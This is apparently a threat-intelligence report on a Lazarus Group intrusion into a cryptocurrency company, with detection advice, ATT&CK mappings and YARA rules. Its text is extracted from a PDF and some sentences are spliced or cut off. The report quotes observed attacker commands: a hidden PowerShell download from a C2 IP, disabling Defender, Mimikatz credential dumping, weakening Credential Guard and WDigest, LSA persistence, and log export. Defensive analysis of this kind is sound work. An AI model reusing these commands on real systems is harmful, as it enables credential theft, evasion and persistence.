Tactical Intelligence Report2020-08-18F-Secure.com | © F-Secure LABS0INTRODUCTIONIn 2019, F-Secure uncovered technical details on Lazarus Group’s1 modus operandi during an investigation of an attack on an organisation in the cryptocurrency vertical, hereafter referred to as “the target”. The attack was linked to a wider, ongoing global phishing campaign. The detail in this report provides detection opportunities for blue teams seeking to defend their organizations from attacks by the group.Lazarus Group’s interests reportedly align with those of the government of the Democratic People's Republic of Korea (DPRK). According to a 2019 UN report2 Lazarus Group has been targeting organizations in the cryptocurrency vertical since at least 2017. Consistent with public reporting on the group’s activities, the main objective of the attack uncovered by F-Secure was financial gain.F-Secure attributed the attack to the Lazarus Group based on similarities in malware, Tactics, Techniques & Procedures (TTPs) observed, and wider intelligence of the group’s operational practices. F-Secure’s analysis of the malware suggested strong similarities to samples leveraged in other Lazarus Group campaigns, detailed in research previously published by Kaspersky3 and ESET4. Lazarus Group was observed leveraging a combination of custom malware and native operating system (OS) utilities to reach its objective.Through the investigation it became clear that Lazarus Group invests significant time in operational security to avoid detection and remove evidence of their activity. Prior to F-Secure's investigation, Lazarus Group attempted to remove evidence of its presence on the target through the secure deletion of tooling and log data. However, some samples were retrievable, as well as some auto-captured by the target’s Endpoint Detection & Response (EDR) solution.F-Secure assess the attack on the target to be advanced in nature and was able to link this activity with a global phishing campaign running since at least January 2018. The attack was linked to this wider set of activity through several common indicators found in samples from the investigation, open source repositories, and proprietary intelligence sources. Where possible, evidence has been included in the body and appendices of this report to allow the security industry to leverage these details across their apertures, and draw their own conclusions. F-Secure believes this information will help targeted organizations protect their networks from future attacks and raise the cost of operation for the group.1 url 2 url 3 url 4 url | © F-Secure LABS1INITIAL ACCESSF-Secure’s investigation revealed that a system administrator from the target organization received a phishing document via their personal LinkedIn account. The document masqueraded as a legitimate job advert for a role in a blockchain technology company that matched the employee’s skills.Though the document on the target’s host had been altered to remove malicious content after execution, F-Secure assessed that the original document was the same, or similar to, a sample publicly available on VirusTotal5 (see image below). This was based on metadata analysis and execution evidence noted in the System Resource Usage Monitor (SRUM) database.Figure 1: Malicious document listed by VirusTotalMetadata analysis showed the document and VirusTotal sample shared identical values for the document name, author, last saved by, and word count properties. The creation time and character count were not could have been modified roughly thirty minutes after it was created.Figure 3: Target’s malicious document MFT entriesF-Secure.com | © F-Secure LABS3When reviewing the LNK (link) file on the target host relating to the document, the original file size can be seen in the “target file size” field. This file size is identical to the malicious VirusTotal sample, providing another strong link between the two documents.Figure 4: Target’s malicious document LNK metadataAs can be seen in the below image, the malicious version of the document claimed to be protected by General Data Protection Regulation (GDPR) and that content needed to be enabled in Word to access the document. The enablement of content would then result in the malicious embedded macro code to execute.Figure 5: Malicious document GDPR contentThe malicious execution chain was then the same as noted in the JPCERT report6, where the macro in the document creates an LNK file that resulted in the execution of mshta.exe to call out to a “bit.ly” link created in early May 2019.6 url | © F-Secure LABS4mshta.exe url link was accessed 73 times from several countries, as noted in Figure 6 below. Some of these were likely researchers, however, the spike in May, and the countries with high counts, led F-Secure to assess that this was a relatively widely-targeted lure document.Figure 6: “bit.ly” link access statisticsThe “bit.ly” link redirected to a domain from which a VBScript was executed to perform checks on the host and collect further information to send to a second Command and Control (C2) domain. This script and execution chain are covered in more detail in the Weibu Intelligence Bureau report7 .In the F-Secure investigation, this eventually led to the download and execution of a PowerShell script that retrieved a further payload from a third C2 domain. Shortly after this payload was retrieved, the main implants used by Lazarus Group appeared on the target host.C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w Hidden -ep Bypass-file C:Users\<USER>\AppData\Local\Temp\usoclient.ps1 66.181.166[.]15:8080/uc 188652471Once the initial chain of infection had executed, the main implant leveraged against the target was downloaded and loaded in to the lsass.exe process. Evidence of this execution was captured within the SRUM database as well as the data transferred to and from the target host (see screenshot below). Note, the entry7 url | © F-Secure LABS5time is not accurate and reflects the time written to the database rather than the time of execution, which usually accounts for activity across the previous hour.Figure 7: System Resource Usage Monitor (SRUM) database entriesThis infection chain appeared to be highly conditional based on information retrieved from the target, and notably differs across other public reporting of the campaign. The different possible execution chains observed by F-Secure are detailed in the diagram below.F-Secure.com | © F-Secure LABS6Figure 8: Infection chainF-Secure leveraged additional available data to pivot from this observed activity to further phishing artefacts, assessed to be part of a wider campaign running since at least January 2018. Artifacts identified were linked to fourteen countries, suggesting this was a wide-ranging global campaign. Those countries were: US, CN, UK, CA, DE, RU, KR, AR, SG, HK, NL, EE, JP & PH. The Indicators of Compromise (IOCs) relating to these artefacts are included in the appendices below.F-Secure.com | © F-Secure LABS7NETWORK BACKDOOR IMPLANTSLazarus Group leveraged two separate network backdoor implants that appeared similar to the “Passive Backdoor” first reported8 by Kaspersky as being used by the group in 2016. The samples F-Secure analysed were packed using Themida and despite being x64 variants, analysis showed significant code similarities with windows netsh utility to open that port in the Windows Firewall. The implant was observed operating on TCP ports 443, 3388, 3399, 5500 and 5555; example execution recorded on the target network is shown below.C:\ProgramData\mcc.exe 3388netsh firewall add portopening TCP 3388 AssistanceDespite the difference in instruction set it is possible to see the same operation was used to hide the console window and the same amount of time is defined to both wait for the operation to be completed and to sleep before continuing. These similarities can be seen in the screenshot below.8 url | © F-Secure LABS8Figure 9: Network backdoor code similaritiesThe samples analysed by F-Secure also shared similarities with a “TCP Backdoor” reportedly used by Lazarus Group in a 2018 ESET report9 in attacks against Figure 10 shows the same strings across the unpacked samples from the three different intrusions.9 url | © F-Secure LABS9Figure 10: Netsh string commonalitiesAs the ESET report details, the backdoor can execute a number of commands it receives via the listening port, and also stores logging and configuration information in files such as “perflog.dat” and “perflog.evt” in the “%WINDIR%\Temp\” directory.F-Secure.com | © F-Secure LABS10CUSTOM PE LOADERF-Secure’s investigation uncovered “LSSC.dll” file was loaded into the lsass.exe process by masquerading as a “Security Package”10 via the “HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages” registry key.F-Secure observed that Lazarus Group would modify this key locally using the reg windows utility and check this was successful via the same utility. Once this was confirmed as successful the system would be restarted in order for DLL to be loaded. Examples of these executions can be seen below.reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v Security Packagesreg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v Security Packages /t REG_MULTI_SZ /d lssc /freg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v Security Packagesshutdown /t 0 /r /fLater in the intrusion Lazarus Group was observed modifying this registry key remotely using the schtasks windows utility, as can be seen in the below snippet.cmd.exe /c "schtasks /Create /S <IP ADDRESS> /P <PASSWORD>! /U "<DOMAIN>\<USER> " /TN "MSC" /TR "reg add /"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa/" /v /"Security Packages/" /t REG_MULTI_SZ /d /"ldap/" /f" /SC ONSTART /RU SYSTEM /F >C:\Windows\TEMP\TMPD2E6.tmp 2>&1"The sample analysed was compiled just prior to the observed use and the internal name of the file was “xml.dll”. The file was dropped in the System32 directory, and once executed it is hardcoded to attempt to use custom PE loading code for the file “LDAP.dat”. F-Secure was unable to retrieve a copy of “LDAP.dat”, but it is believed to contain a final payload that provides Lazarus Group with the ability to execute additional commands.10 url | © F-Secure LABS11MAIN IMPLANTSThe main implants both contain the capability to download additional files, decompress data in memory, initiate C2 communication, execute arbitrary commands, and steal credentials from a number of sources. The into the System32 directory and loaded in to the lsass.exe process. Analysis indicates that this file has the capability to be loaded in multiple ways. The implant is a x64 DLL and contains the Zlib 1.2.7 and Libcurl 7.47.1 software libraries, suggesting it is capable of downloading and decompressing additional data.Once loaded, it will read and decrypt configuration information from a 6,816 byte “.sdb” file stored in “%WINDIR%\AppPatch\”. The samples F-Secure analysed were specifically looking for configuration files with the name “mscmain.sdb” or “msomain.sdb”, and were decrypted using the RC4 key “F9 5E 06 0B E3 1B 18 03 24 3F 00 CC DE AB F6 93 1B 2A CB 5B 6A C3 67 36 62 60 EC 82 46 37 D2 4A”. The implant also has the ability to encrypt and write this data to disk, allowing Lazarus Group to update this information when required.The “.sdb” file contained C2 information as well as a hardcoded target specific directory (“C:\Users\<redacted>\AppData\Roaming\Microsoft\CLR\”) referencing additional malicious files. Though DLL similar to “LSSVC.dll”. However, this variant was dropped in the “C:\Users\” directory and is not designed to be loaded into the lsass.exe process.“NTUSER.cat” uses the same software libraries as “LSSVC.dll” and also reads configuration information from the same “.sdb” files; however, this implant has the additional capability to load the referenced files from disk and inject them into another process. The files were loaded using the following steps:• Read the file into a memory buffer• The first 0x80 bytes are read, but only the first 0x60 bytes are interpreted as the RC4 key to decrypt theremainder of the file• Decrypt the data using this key and the RC4 algorithm• If the resulting data is a PE file, it is injected and loaded in to the “explorer.exe” process.The copies of these additional files retrieved by F-Secure had been overwritten with random data in order to prevent further analysis.F-Secure.com | © F-Secure LABS12OTHER TACTICS, TECHNIQUES AND PROCEDURES (TTPS)F-Secure identified several other TTPs of interest leveraged by Lazarus Group during the attack. To avoid detection, Lazarus Group disabled Windows Defender monitoring as one of their first actions on each host they accessed. This was done through the execution of the below PowerShell commands.cmd.exe /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Set-MpPreference -DisableBehaviorMonitoring $false 2>&1cmd.exe /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Set- MpPreference -DisableRealtimeMonitoring $true 2>&1As reported by ESET, Lazarus Group was observed using a custom version of Mimikatz to capture credentials; however, as can be seen below they have not obfuscated the commonly used functions.cmd.exe c:\users\public\pmp.dat privilege::debug sekurlsa::logonPasswordsTo enable this Lazarus Group was observed disabling Credential Guard and enabling the storage of credentials in memory via the below registry key modifications.cmd.exe /c reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v LsaCfgFlags /t REG_DWORD /d 0 /f 2>&1cmd.exe /c reg add HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 2>&1Throughout F-Secure's investigation it became evident that Lazarus Group was conscious to avoid detection and would remove evidence of their presence, as can be seen in the below snippet.cmd.exe /c "wevtutil epl security "/q:*[System[(EventID=4778 or EventID=4624)]]"c:\users\public\evt2.dat >C:\Windows\TEMP\TMP1AC9.tmp 2>&1"On all but a single host, which was powered off halfway through the intrusion and therefore unreachable, Lazarus Group was able to securely delete traces of any of the malware they employed as well as significant quantities of forensic evidence. The presence of a third-party EDR agent with auto-capture features for certain file types proved a valuable source of evidence preserved from this deletion. In addition, the live EDR data recorded valuable details of actions performed by the group.F-Secure.com | © F-Secure LABS13DETECTIONThe execution of these commands provide significant opportunities for detection for any organisation with EDR telemetry. Whilst the goal of some of the commands are to ultimately avoid detection and remain stealthy, these actions are “noisy” in themselves and provide detection opportunities. The above provided examples of the disabling of windows security controls should be anomalous in any network, and can be used to engineer high fidelity detection use cases.Lazarus Group was observed executing a large number of commands through cmd.exe and other native OS utilities throughout their time on the target network. Despite attempts to avoid detection and blend in with standard activity on the network, elements of the commands used will often be anomalous and use specific esoteric strings that offer blue teams detection opportunities. One distinctive trait common across the majority of the commands executed by Lazarus Group was the appending of the string “2>&1” to commands; which whilst used by some tooling should be anomalous when filtered by parent child process relationship, and provide good detection opportunities.F-Secure advises organisations with Lazarus Group in their threat profile to develop good coverage of these native OS techniques to maximise detection opportunities. These commands can blend in with standard activity, so it may not be possible to build high fidelity detection for all the techniques used. In this situation the use of lower fidelity detections that are then aggregated on a host basis in order to correlate activity and build intelligent thresholding in to alerting systems can help to detect malicious activity without generating too many false positives.The custom PE loader and one variant of the main implant were both loaded in to the lsass.exe process as unsigned DLLs, which is a high-fidelity indicator for anyone monitoring these module load events. The addition of the registry key to load these files is also a high-fidelity indicator that could be detected through the command line execution or registry scanning for the creation of keys in this path.There were a number of files created on disk by Lazarus Group, with notably “perflog.dat” and “perflog.evt” having been created in the “%WINDIR%\Temp\” directory and observed across previous campaigns. In addition, analysis of the main implants indicates they create the file “mscmain.sdb” or “msomain.sdb” in the “%WINDIR%\AppPatch\” directory. In both cases the files appear to be uniquely used by this group; therefore, provide a high fidelity indicator that can be used for detection and potential attribution.Beyond host level detection there are also significant opportunities to detect the network layer activity of the various implants, which were using anomalous ports to communicate between workstations and servers that would stand out from standard traffic. The target organisation had an artificial intelligence based network detection security tool installed, unfortunately this did not raise any alerts generated during this time period. The tool was a useful source for evidence during the investigation and the telemetry collected did contain actionable detection data that blue teams could leverage for proactive means.F-Secure.com | © F-Secure LABS14CONCLUSIONLazarus Group has demonstrated sophistication and operational security awareness in executing a prolonged and ostensibly successful cybercrime campaign. The success of this campaign is evidenced in a recent announcement by the US Treasury11 relating to money laundering of the profits of Lazarus Group. The findings of F-Secure’s investigation are consistent with the strategic intelligence picture, but provide more detail on the group’s current tactics, techniques and procedures.Lazarus Group’s activities are a continued threat: the phishing campaign associated with this attack has been observed continuing into 2020, raising the need for awareness and ongoing vigilance amongst organisations operating in the targeted verticals. It is F-Secure’s assessment that the group will continue to target organisations within the cryptocurrency vertical while it remains such a profitable pursuit, but may also expand to target supply chain elements of the vertical to increase returns and longevity of the campaign. In addition, some of the newer C2 infrastructure suggests the group may be looking to target organisations in the financial investment vertical.It is also F-Secure’s assessment that organisations in other verticals likely to be targeted by elements of DPRK cyber operations should take note of the details contained within this report. There is evidence in recent reporting12 of Lazarus Group leveraging similar techniques to those observed in this campaign, such as the preference of LinkedIn as a delivery medium, to compromise organisations in other verticals. This is also supported by the evidence that Lazarus Group has re-used tooling across multiple campaigns, as noted previously in this report.Lazarus Group has continued to use some of the same family of tooling observed in 2016, though analysis of several samples suggest this is being updated over time. It is F-Secure’s assessment that the investment in both malware anti-analysis techniques and operational security to remove evidence of their presence has preserved the operationally effectiveness of this tooling for Lazarus Group. It is also possible that the group lack the capability to easily retool and therefore are reliant on maximising the utility of the existing tooling at their disposal. However, other tooling has been publicly attributed to the group which suggests further capability can be leveraged if required due to target controls.F-Secure found that the activities performed by Lazarus Group, whilst effective, offered significant opportunities for detection. Organisations targeted by Lazarus Group should review their detection capability, with regards to both technology and people, against the techniques noted in this report and those in the MITRE ATT&CK framework13 attributed to the Lazarus Group.The target in this investigation had a leading EDR and network security tool installed that captured telemetry of Lazarus Groups actions, but this did not result in a positive detection that was actioned. It is F-Secure’s view that people play an important role in building effective detection capability, and this incident serves as an example of the need to invest in people as well as technology.11 url 12 url PayloadsEncrypted Execution: MshtaA malicious mshta command was executed as a result of the phishingdocument being interacted withT1059.001Command and Scripting Interpreter: PowerShellA PowerShell script was executed to download additional payloads earlyin the attackF-Secure.com | © F-Secure LABS20IDNameDescriptionT1059.003Command and ScriptingInterpreter: Windowscmd.exe was used to execute numerous commands by the threat actor during the attack, mostly with the malicious implants as a parent processCommand ShellT1059.005Command and Scripting Interpreter: Visual BasicT1543.003Create or Modify System Process: Windows ServiceT1053.005Scheduled Task/Job:Scheduled TaskA VBS script was executed to collect information and execute additionalcommands from C2Windows services were used for persistence during the attackScheduled tasks were primarily used to remotely install persistence ontarget hostsT1547.005Boot or Logon AutostartExecution: Security SupportThe main malware implants were executed and persisted through beingloaded as an security support provider in lsass.exeProviderT1070.001Indicator Removal on Host: Clear Windows Event LogsEvent logs were manipulated and deleted across multiple hosts duringthe attackT1070.004Indicator Removal on Host:Malware samples and other forensic evidence was deleted acrossFile Deletionmultiple hosts during the attackT1055.002Process Injection: PortableSome of the malware implants had PE injection capability to loadT1027.002Executable InjectionObfuscated Files orInformation: SoftwarePackingadditional payloadsThe malware samples were packed with VMProtect or ThemidaT1112Modify RegistryVarious registry entries were modified to install persistence or changesettings of security controlsT1003.001OS Credential Dumping:Mimikatz was used to dump credentials out of LSASS memoryLSASS MemoryT1552.001Unsecured Credentials:Credentials were accessed from text files on user desktops to access andCredentials In Filesbypass certain controlsT1021.001Remote Services: RemoteRDP was used to laterally move around the target network using validDesktop ProtocolaccountsT1021.005Remote Services: VNCVNC was leveraged to laterally move across some hosts during the attackT1083File and Directory DiscoveryThe threat actor was observed searching for key files of interest thatcontained credentials, architecture information or sensitive financial dataT1071.001Application Layer Protocol:The malware implants leveraged HTTPS to communicate with the threatWeb Protocolsactors C2sYararule lazarus_rc4_loop{meta:F-Secure.com | © F-Secure LABS21author="f-secure "description="Detects RC4 loop in Lazarus Group implant"date="2020-06-10"strings:$str_rc4_loop = { 41 FE 8? 00 01 00 00 45 0F B6 ?? 00 01 00 00 48 FF C? 43 0F B6 0? ?? 41 00 8? 01 01 00 00 41 0F B6 ?? 01 01 00 00 }condition:int16(0) == 0x5a4dand filesize < 3000KBand $str_rc4_loop}rule lazarus_lssvc_ntuser_unpacked{meta:author="f-secure"description="Detects unpacked variant of Lazarus Group implant"date="2020-06-10"strings:$str_curl = "CLIENT libcurl" ascii$str_mask = "%s%s\\%s" ascii wide fullword$str_exe_1 = "explorer.exe" ascii wide nocase$str_exe_2 = "lsass.exe" ascii wide nocase$str_misc_ext = ".cid" ascii wide$str_misc_debug = "SeDebugPrivilege" ascii wide$str_misc_ntdll = "NtProtectVirtualMemory" asciicondition:$str_curland $str_maskand 1 of ($str_exe*)and 2 of ($str_misc*)}rule lazarus_network_backdoor_unpacked{meta:author="f-secure"description="Detects unpacked variant of Lazarus Group network backdoor"date="2020-06-10"strings:$str_netsh_1 = "netsh firewall add portopening TCP %d" ascii wide nocase$str_netsh_2 = "netsh firewall delete portopening TCP %d" ascii wide nocase$str_mask_1 = "cmd.exe /c \"%s >> %s 2>&1\"" ascii wideF-Secure.com | © F-Secure LABS22$str_mask_2 = "cmd.exe /c \"%s 2>> %s\"" ascii wide$str_mask_3 = "%s\\%s\\%s" ascii wide$str_other_1 = "perflog.dat" ascii wide nocase$str_other_2 = "perflog.evt" ascii wide nocase$str_other_3 = "cbstc.log" ascii wide nocase$str_other_4 = "LdrGetProcedureAddress" ascii$str_other_5 = "NtProtectVirtualMemory" ascicondition:int16(0) == 0x5a4dand filesize < 3000KBand 1 of ($str_netsh*)and 1 of ($str_mask*)and 1 of ($str_other*)}F-Secure.com | © F-Secure LABS23 